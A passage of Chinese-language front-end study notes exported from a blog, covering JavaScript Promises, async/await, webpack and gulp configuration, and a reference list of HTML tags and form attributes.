class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建多个，且必须都成功</span></span><br><span class="line"><span class="comment">// 只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。</span></span><br><span class="line"><span class="comment">// 只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="title class_">Promise</span>.<span class="title function_">all</span>([p1,p2,p3]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建多个，只要有一个成功</span></span><br><span class="line"><span class="comment">// 只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的Promise实例的返回值，就传递给p的返回值。</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="title class_">Promise</span>.<span class="title function_">race</span>([p1,p2,p3]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 肯定返回成功，所有都完成了</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="title class_">Promise</span>.<span class="title function_">allSettled</span>([p1, p2])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将现有对象转为Promise对象</span></span><br><span class="line"><span class="keyword">var</span> jsPromise = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>($.<span class="title function_">ajax</span>(<span class="string">&#x27;/whatever.json&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line">p.<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">s</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(s)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;出错了&#x27;</span>);</span><br><span class="line">p.<span class="title function_">then</span>(<span class="literal">null</span>, <span class="keyword">function</span> (<span class="params">s</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(s)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p>Ajax使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ajax</span>(<span class="params">URL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span> (<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); </span><br><span class="line">        req.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="variable constant_">URL</span>, <span class="literal">true</span>);</span><br><span class="line">        req.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">status</span> === <span class="number">200</span>) &#123; </span><br><span class="line">                <span class="title function_">resolve</span>(req.<span class="property">responseText</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(req.<span class="property">statusText</span>));</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;;</span><br><span class="line">        req.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(req.<span class="property">statusText</span>));</span><br><span class="line">        &#125;;</span><br><span class="line">        req.<span class="title function_">send</span>(); </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">URL</span> = <span class="string">&quot;/try/ajax/testpromise.php&quot;</span>; </span><br><span class="line"><span class="title function_">ajax</span>(<span class="variable constant_">URL</span>).<span class="title function_">then</span>(<span class="keyword">function</span> <span class="title function_">onFulfilled</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;内容是：&#x27;</span> + value); </span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="keyword">function</span> <span class="title function_">onRejected</span>(<span class="params">error</span>)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;错误：&#x27;</span> + error); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="Async-Await"><a href="#Async-Await" class="headerlink" title="Async &#x2F; Await"></a>Async &#x2F; Await</h2><p>async&#x2F;await是基于Promise实现的，它不能用于普通的回调函数。</p>
<p>async可以修饰一个函数，这个函数里面可以使用await关键字。</p>
<p>await的语义是：必须等到await后面跟的Promise有了返回值，才能继续执行await的下一行代码。但是await是非阻塞的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> str = <span class="keyword">await</span> <span class="title function_">readFile</span>(<span class="string">&quot;./a.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(str)&#123;</span><br><span class="line">        <span class="comment">// 失败的话，要用 try catch 捕获</span></span><br><span class="line">        <span class="keyword">let</span> fr2 = <span class="keyword">await</span> <span class="title function_">readFile</span>(str)</span><br><span class="line">        <span class="keyword">if</span>(fr2)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(fr2)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回 成功的Promise</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 返回失败的 Promise</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h1><h1 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h1><p>ES 6 建议使用Webpack。webpack 是一个现代 JavaScript 应用程序的静态模块打包器 (module bundler) 。当 webpack 处理应用程序时，它会递归地构建一个依赖关系图 (dependency graph) ，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle 。</p>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>webpack 主要有四个核心概念:</p>
<ul>
<li>入口 (entry)</li>
<li>输出 (output)</li>
<li>loader</li>
<li>插件 (plugins)</li>
</ul>
<h3 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h3><p>入口会指示 webpack 应该使用哪个模块，来作为构建其内部依赖图的开始。入口的写法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单个入口</span></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&quot;./src/main.js&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象</span></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">app</span>: <span class="string">&quot;./src/main.js&quot;</span>,</span><br><span class="line">  <span class="attr">vendors</span>: <span class="string">&quot;./src/vendors.js&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&quot;./src/main.js&quot;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h3><p>loader 让 webpack 可以去处理那些非 JavaScript 文件（ webpack 自身只理解 JavaScript ）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过 loader 将 ES6 的语法转为 ES5 </span></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&quot;./src/main.js&quot;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="attr">test</span>: <span class="regexp">/\.js$/</span>,</span><br><span class="line">          <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>,</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&quot;babel-loader&quot;</span>,</span><br><span class="line">          <span class="attr">options</span>: [</span><br><span class="line">            <span class="attr">presets</span>: [<span class="string">&quot;env&quot;</span>]</span><br><span class="line">          ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>loader 被用于转换某些类型的模块，而插件则可以做更多的事情。包括打包优化、压缩、定义环境变量等等。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过 npm 安装</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HtmlWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>);</span><br><span class="line"><span class="comment">// 用于访问内置插件 </span></span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>); </span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="attr">test</span>: <span class="regexp">/\.js$/</span>,</span><br><span class="line">          <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>,</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&quot;babel-loader&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;<span class="attr">template</span>: <span class="string">&#x27;./src/index.html&#x27;</span>&#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>搭建应用<code>webpack.config.js</code>：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&quot;development&quot;</span>, <span class="comment">// &quot;production&quot; | &quot;development&quot;</span></span><br><span class="line">  <span class="comment">// 选择 development 为开发模式， production 为生产模式</span></span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&quot;./src/main.js&quot;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.js$/</span>,</span><br><span class="line">        <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>,</span><br><span class="line">        <span class="attr">loader</span>: <span class="string">&quot;babel-loader&quot;</span>,</span><br><span class="line">        <span class="attr">options</span>: [</span><br><span class="line">          <span class="attr">presets</span>: [<span class="string">&quot;env&quot;</span>]</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    ...</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="gulp"><a href="#gulp" class="headerlink" title="gulp"></a>gulp</h3><p>gulp 是一个基于流的自动化构建工具，具有易于使用、构建快速、插件高质和易于学习的特点，常用于轻量级的工程中。</p>
<p>在项目根目录下创建名为 gulpfile.js 的文件:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> gulp = <span class="built_in">require</span>(<span class="string">&#x27;gulp&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> uglify = <span class="built_in">require</span>(<span class="string">&quot;gulp-uglify&quot;</span>);  </span><br><span class="line"><span class="comment">// default 表示一个任务名，为默认执行任务</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;default&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  gulp.<span class="title function_">src</span>(<span class="string">&#x27;./src/main.js&#x27;</span>)</span><br><span class="line">      .<span class="title function_">pipe</span>(<span class="title function_">uglify</span>())</span><br><span class="line">      .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;./dist&#x27;</span>));</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>安装Webpack，首先要安装node.js。</p>
<p><a href="https://nodejs.org/zh-cn/download/">node.js 官网</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">cnpm install webpack -g</span><br><span class="line"><span class="comment"># 创建应用</span></span><br><span class="line"><span class="built_in">mkdir</span> app</span><br><span class="line"><span class="comment"># 编辑文件</span></span><br><span class="line"><span class="built_in">touch</span> app/app.js</span><br><span class="line"><span class="built_in">touch</span> app/index.html</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;It works.&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;bundle.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后打包应用：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">webpack app.js bundle.js</span><br><span class="line"><span class="comment"># 或编辑配置文件后</span></span><br><span class="line">webpack</span><br></pre></td></tr></table></figure>

<p>配置文件：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> webpack=<span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">entry</span>: <span class="string">&quot;./app.js&quot;</span>,</span><br><span class="line">    <span class="attr">output</span>: &#123;</span><br><span class="line">        <span class="attr">path</span>: __dirname,</span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">module</span>: &#123;</span><br><span class="line">        <span class="attr">loaders</span>: [</span><br><span class="line">            &#123; <span class="attr">test</span>: <span class="regexp">/\.css$/</span>, <span class="attr">loader</span>: <span class="string">&quot;style-loader!css-loader&quot;</span> &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">plugins</span>:[</span><br><span class="line">    <span class="keyword">new</span> webpack.<span class="title class_">BannerPlugin</span>(<span class="string">&#x27;菜鸟教程 webpack 实例&#x27;</span>)</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h1 id="JSX"><a href="#JSX" class="headerlink" title="JSX"></a>JSX</h1>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML</title>
    <url>/2020/01/14/%E5%89%8D%E7%AB%AF/HTML/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 声明H5页面 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 元数据，utf-8和GBK支持中文 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>doctype</p>
<ul>
<li>使用标准模式渲染</li>
<li>知道元素的合法性 HTML4 XHTML HTML5</li>
</ul>
<p>head</p>
<ul>
<li>meta</li>
<li>title</li>
<li>style</li>
<li>link</li>
<li>script</li>
<li>base - a 标签的 base url</li>
</ul>
<p>body</p>
<ul>
<li>div &#x2F; section &#x2F; article &#x2F; aside &#x2F; header &#x2F; footer</li>
<li>p</li>
<li>span &#x2F; em &#x2F; strong</li>
<li>table &#x2F; thead &#x2F; tbody &#x2F; tr &#x2F; td</li>
<li>ul &#x2F; ol &#x2F; li &#x2F; dl &#x2F; dt &#x2F; dd </li>
<li>a </li>
<li>form &#x2F; input &#x2F; select &#x2F; …</li>
</ul>
<p>重要属性</p>
<ul>
<li><code>a[href, target]</code></li>
<li><code>img[src, alt]</code></li>
<li><code>table td[colspan, rowspan]</code></li>
<li><code>form[target, method, enctype]</code></li>
<li><code>input[type, value]</code></li>
<li><code>button[type]</code></li>
<li><code>select&gt;option[value]</code></li>
<li><code>label[for]</code></li>
</ul>
<p>对于默认样式，可以用<code>reset</code>模块重绘。</p>
<p><code>property</code>与<code>attribute</code>互不影响：</p>
<ul>
<li>property - 写在JavaScript中，可变</li>
<li>attribute - 写在HTML中，不可变</li>
</ul>
<h1 id="基本标签"><a href="#基本标签" class="headerlink" title="基本标签"></a>基本标签</h1><p>html</p>
<ul>
<li>manifest：规定文档的缓存 manifest 的位置。可能的值：<ul>
<li>绝对 URL - 指向另一个网站（比如 href&#x3D;”<a href="http://www.example.com/demo.appcache%22%EF%BC%89">http://www.example.com/demo.appcache&quot;）</a></li>
<li>相对 URL - 指向网站内的一个文件（比如 href&#x3D;”demo.appcache”）</li>
</ul>
</li>
<li>xmlns：只有XHTML支持，规定namespace属性。</li>
</ul>
<p>p<br>br<br>hr<br>h1<br>h6<br>title<br>body</p>
<h1 id="格式标签"><a href="#格式标签" class="headerlink" title="格式标签"></a>格式标签</h1><p>blockquote：定义摘自另一个源的块引用</p>
<ul>
<li>cite：URL，规定引用的来源。</li>
</ul>
<p>q：定义一个短的引用。</p>
<ul>
<li>cite：URL，规定引用的来源。</li>
</ul>
<p>address：定义文档作者&#x2F;所有者的联系信息</p>
<p>cite：定义作品（比如书籍、歌曲、电影、电视节目、绘画、雕塑等等）的标题</p>
<p>bdi：设置一段文本，使其脱离其父元素的文本方向设置</p>
<p>bdo：文字显示方向</p>
<ul>
<li>dir：规定文字的文本方向<ul>
<li>值：ltr，rtl</li>
</ul>
</li>
</ul>
<p>abbr：表示一个缩写词或者首字母缩略词</p>
<p>b：加粗</p>
<p>i：斜体</p>
<p>u：下划线</p>
<p>mark：带星号文本</p>
<p>small：定义小型文本（和旁注）。</p>
<p>sub：下标</p>
<p>sup：上标</p>
<p>del：删除</p>
<ul>
<li>cite：URL，规定一个解释了文本被删除的原因的文档的 URL</li>
<li>datetime：YYYY-MM-DDThh:mm:ssTZD，规定文本删除时间</li>
</ul>
<p>ins：插入文本</p>
<ul>
<li>cite：URL，规定一个解释了文本被删除的原因的文档的 URL</li>
<li>datetime：YYYY-MM-DDThh:mm:ssTZD，规定文本删除时间</li>
</ul>
<p>wbr：单词换行分割</p>
<p>s：对那些不正确、不准确或者没有用的文本进行标识。</p>
<p>em：呈现为被强调的文本。</p>
<p>strong：定义重要的文本。</p>
<p>code：定义计算机代码文本。</p>
<p>dfn：一个短语标签，用来定义一个定义项目。</p>
<p>samp：定义样本文本。</p>
<p>kbd：定义键盘文本。它表示文本是从键盘上键入的。它经常用在与计算机相关的文档或手册中。</p>
<p>var：定义变量。可以将此标签与 pre 及 code 标签配合使用。</p>
<p>pre：定义预格式化的文本。被包围在pre标签元素中的文本通常会保留空格和换行符。而文本也会呈现为等宽字体。</p>
<p>ruby：定义 ruby 注释（中文注音或字符）。</p>
<p>rp：在 ruby 注释中使用，以定义不支持 ruby 元素的浏览器所显示的内容。</p>
<p>rt：标签定义字符（中文注音或字符）的解释或发音。</p>
<p>meter：定义度量衡（磁盘空间使用情况等）。类似于进度条，但不是。</p>
<ul>
<li>form：form_id，规定 meter 元素所属的一个或多个表单。</li>
<li>high：number，规定被界定为高的值的范围。</li>
<li>low：number，规定被界定为低的值的范围。</li>
<li>max：number，规定范围的最大值。</li>
<li>min：number，规定范围的最小值。</li>
<li>optimum：number，规定度量的最优值。</li>
<li>value：number，必需。规定度量的当前值。</li>
</ul>
<p>progress：定义进度条。</p>
<ul>
<li>max：需要完成的最大值</li>
<li>value：当前值</li>
</ul>
<p>time：定义公历的时间（24 小时制）或日期，时间和时区偏移是可选的。</p>
<ul>
<li>datetime：datetime，规定日期&#x2F;时间。</li>
<li>pubdate：datetime，指示 time 元素中的日期 &#x2F; 时间是文档（或最近的前辈 article 元素）的发布日期</li>
</ul>
<h1 id="表单标签"><a href="#表单标签" class="headerlink" title="表单标签"></a>表单标签</h1><p>form：表单</p>
<ul>
<li>accept-charset：character_set，规定服务器可处理的表单数据字符集。</li>
<li>action：URL，规定当提交表单时向何处发送表单数据。</li>
<li>autocomplete：on&#x2F;off，规定是否启用表单的自动完成功能。</li>
<li>enctype：规定在向服务器发送表单数据之前如何对其进行编码。（适用于 method&#x3D;”post” 的情况）<ul>
<li>application&#x2F;x-www-form-urlencoded</li>
<li>multipart&#x2F;form-data</li>
<li>text&#x2F;plain</li>
</ul>
</li>
<li>method：get&#x2F;post，规定用于发送表单数据的 HTTP 方法。</li>
<li>name：text，规定表单的名称。</li>
<li>novalidate：novalidate，如果使用该属性，则提交表单时不进行验证。</li>
<li>target：规定在何处打开 action URL。<ul>
<li>_blank</li>
<li>_self</li>
<li>_parent</li>
<li>_top</li>
</ul>
</li>
</ul>
<p>label：为 input 元素定义标注（标记）。</p>
<ul>
<li>for：element_id，规定 label 与哪个表单元素绑定。</li>
<li>form：form_id，规定 label 字段所属的一个或多个表单。</li>
</ul>
<p>input：规定了用户可以在其中输入数据的输入字段。</p>
<ul>
<li>accept：<code>audio/* video/* image/* MIME_type</code>，规定通过文件上传来提交的文件的类型。 (只针对type&#x3D;”file”)</li>
<li>alt：定义图像输入的替代文本。 (只针对type&#x3D;”image”)</li>
<li>autocomplete：on off，规定输入字段是否应该启用自动完成功能。</li>
<li>autofocus：属性规定当页面加载时元素应该自动获得焦点。</li>
<li>checked：规定在页面加载时应该被预先选定的input元素。 (只针对 type&#x3D;”checkbox” 或者 type&#x3D;”radio”)</li>
<li>disabled：规定应该禁用的 input 元素。</li>
<li>width：pixels，宽度(只针对type&#x3D;”image”)</li>
<li>height：pixels，高度(只针对type&#x3D;”image”)</li>
<li>name：元素的名称。</li>
<li>max：number &#x2F; date，元素的最大值。</li>
<li>min：元素的最小值。</li>
<li>maxlenght：允许的最大字符数。</li>
<li>multiple：允许用户输入到元素的多个值。</li>
<li>pattern：用于验证元素的值的正则表达式。</li>
<li>placeholder：描述输入字段预期值的简短的提示信息 。</li>
<li>readonly：输入字段是只读的。</li>
<li>required：规定必需在提交表单之前填写输入字段。</li>
<li>size：规定以字符数计的元素的可见宽度。</li>
<li>src：URL，规定显示为提交按钮的图像的 URL。 (只针对 type&#x3D;”image”)</li>
<li>step：合法数字间隔。</li>
<li>value：值。</li>
<li>list：datalist_id，属性引用 datalist 元素，其中包含 input 元素的预定义选项。</li>
<li>type：元素的类型。<ul>
<li>radio：单选按钮</li>
<li>checkbox：复选框</li>
<li>range：用于精确值不重要的输入数字的控件</li>
<li>color：拾色器</li>
<li>file：文件选择字段和 “浏览…” 按钮，供文件上传</li>
<li>hidden：隐藏输入字段</li>
<li>date：date 控件</li>
<li>datetime：date 和 time 控件，基于UTC时区</li>
<li>datetime-local：date 和 time 控件，不带时区</li>
<li>time：输入时间的控件</li>
<li>week：week 和 year 控件</li>
<li>month：month 和 year 控件</li>
<li>text：默认</li>
<li>url：输入 URL 的字段</li>
<li>tel：输入电话号码的字段</li>
<li>email：用于 e-mail 地址的字段</li>
<li>number：用于输入数字的字段</li>
<li>password：密码字段</li>
<li>search：输入搜索字符串的文本字段</li>
<li>submit：提交按钮</li>
<li>button：按钮</li>
<li>reset：重置按钮</li>
<li>image：图像作为提交按钮</li>
</ul>
</li>
<li>form：form_id，规定元素所属的一个或多个表单。</li>
<li>formaction：URL，属性规定当表单提交时处理输入控件的文件的 URL。(只针对 type&#x3D;”submit” 和 type&#x3D;”image”)</li>
<li>formenctype：属性规定当表单数据提交到服务器时如何编码(只适合 type&#x3D;”submit” 和 type&#x3D;”image”)。<ul>
<li>application&#x2F;x-www-form-urlencoded </li>
<li>multipart&#x2F;form-data </li>
<li>text&#x2F;plain</li>
</ul>
</li>
<li>formmethod：定义发送表单数据到 action URL 的 HTTP 方法。 (只适合 type&#x3D;”submit” 和 type&#x3D;”image”)</li>
<li>formnovalidate：覆盖form元素的 novalidate 属性。</li>
<li>formtarget：规定表示提交表单后在哪里显示接收到响应的名称或关键词。(只适合 type&#x3D;”submit” 和 type&#x3D;”image”)<ul>
<li>_blank </li>
<li>_self </li>
<li>_parent </li>
<li>_top </li>
<li>framename</li>
</ul>
</li>
</ul>
<p>textarea：一个多行的文本输入控件</p>
<ul>
<li>autofocus：规定当页面加载时，文本区域自动获得焦点。</li>
<li>cols：文本区域内可见的宽度。</li>
<li>disabled：禁用文本区域。</li>
<li>name</li>
<li>placeholder</li>
<li>readonly</li>
<li>required</li>
<li>form：form_id</li>
<li>maxlength：最大字符数。</li>
<li>rows：可见的行数。</li>
<li>wrap：当提交表单时，文本区域中的文本应该怎样换行。</li>
</ul>
<p>button：</p>
